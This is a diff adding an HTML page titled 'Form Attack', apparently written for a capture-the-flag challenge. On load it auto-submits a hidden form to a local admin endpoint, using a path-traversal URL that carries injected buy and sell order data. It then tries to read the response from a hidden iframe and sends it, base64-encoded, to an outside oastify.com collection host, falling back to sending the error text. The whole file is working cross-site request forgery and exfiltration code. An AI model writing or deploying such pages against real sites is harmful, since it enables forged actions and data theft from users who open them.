@@ -1,0 +1,30 @@
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>Form Attack</title>
+  </head>
+  <body>
+      <form id="attackForm" method="POST" action="http://localhost:5000/admin.php" target="hiddenFrame">
+          <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=- {amount: 1, currency: US, op: BUY}
+  - {amount: 1, currency: FL, op: SELL}">
+      </form>
+      <iframe name="hiddenFrame" style="display:none" onload="extractData()"></iframe>
+
+      <script>
+          document.getElementById('attackForm').submit();
+
+          function extractData() {
+              try {
+                  // Cross-origin iframe access will be blocked, but we can try
+                  var content = document.getElementsByName('hiddenFrame')[0].contentDocument.body.innerText;
+                  var img = new Image();
+                  img.src = 'https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/form-flag-data/' + btoa(content);
+              } catch(e) {
+                  // If blocked, just send error info
+                  var img = new Image();
+                  img.src = 'https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/form-error/' + btoa(e.toString());
+              }
+          }
+      </script>
+  </body>
+  </html>
